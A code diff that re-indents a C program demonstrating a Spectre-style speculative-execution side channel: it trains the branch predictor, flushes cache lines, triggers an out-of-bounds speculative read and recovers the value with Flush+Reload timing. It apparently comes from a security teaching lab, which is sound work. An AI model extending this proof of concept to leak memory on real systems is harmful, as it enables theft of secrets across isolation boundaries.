@@ -11,68 +11,68 @@ uint8_t temp = 0;
 
 void flushSideChannel()
 {
-  int i;
-  // Write to array to bring it to RAM to prevent Copy-on-write
-  for (i = 0; i < 256; i++)
-  {
-    array[i * 4096 + DELTA] = 1;
-  }
-  
-  //flush the values of the array from cache
-  for (i = 0; i < 256; i++)
-  {
-    _mm_clflush(&array[i * 4096 + DELTA]);
-  }
+    // Write to array to bring it to RAM to prevent Copy-on-write
+    int i;
+    for (i = 0; i < 256; i++)
+    {
+        array[i * 4096 + DELTA] = 1;
+    }
+
+    //flush the values of the array from cache
+    for (i = 0; i < 256; i++)
+    {
+        _mm_clflush(&array[i * 4096 + DELTA]);
+    }
 }
 
 void reloadSideChannel()
 {
-  int junk = 0;
-  register uint64_t time1, time2;
-  volatile uint8_t *addr;
-  int i;
-  for (i = 0; i < 256; i++)
-  {
-    addr = &array[i * 4096 + DELTA];
-    time1 = __rdtscp(&junk);
-    junk = *addr;
-    time2 = __rdtscp(&junk) - time1;
+    int junk = 0;
+    register uint64_t time1, time2;
+    volatile uint8_t *addr;
 
-    if (time2 <= CACHE_HIT_THRESHOLD)
+    int i;
+    for (i = 0; i < 256; i++)
     {
-      printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
-      printf("The Secret = %d.\n", i);
+        addr = &array[i * 4096 + DELTA];
+        time1 = __rdtscp(&junk);
+        junk = *addr;
+        time2 = __rdtscp(&junk) - time1;
+
+        if (time2 <= CACHE_HIT_THRESHOLD)
+        {
+            printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
+            printf("The Secret = %d.\n", i);
+        }
     }
-  }
 }
 
 void victim(size_t x)
 {
-  if (x < size)
-  {
-    temp = array[x * 4096 + DELTA];
-  }
+    if (x < size)
+    {
+        temp = array[x * 4096 + DELTA];
+    }
 }
 
 int main()
 {
-  int i;
+    // Train the CPU to take the true branch inside victim()
+    int i;
+    for (i = 0; i < 10; i++)
+    {
+        _mm_clflush(&size);
+        victim(i);
+    }
 
-  // Train the CPU to take the true branch inside victim()
-  for (i = 0; i < 10; i++)
-  {
+    // FLUSH the probing array
+    flushSideChannel();
+
+    // Exploit the out-of-order execution
     _mm_clflush(&size);
-    victim(i);
-  }
+    victim(97);
 
-  // FLUSH the probing array
-  flushSideChannel();
-
-  // Exploit the out-of-order execution
-  _mm_clflush(&size);
-  victim(97);
-
-  // RELOAD the probing array
-  reloadSideChannel();
-  return (0);
+    // RELOAD the probing array
+    reloadSideChannel();
+    return (0);
 }
